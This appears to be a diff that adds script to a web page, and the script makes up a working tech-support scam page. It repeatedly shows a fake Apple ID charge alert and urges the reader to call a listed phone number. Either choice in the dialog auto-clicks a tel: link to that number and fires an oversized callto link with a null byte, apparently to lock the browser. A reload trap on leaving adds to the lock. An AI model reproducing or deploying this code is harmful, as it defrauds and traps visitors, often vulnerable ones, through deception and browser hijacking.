+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-307-6168"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-307-6168 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
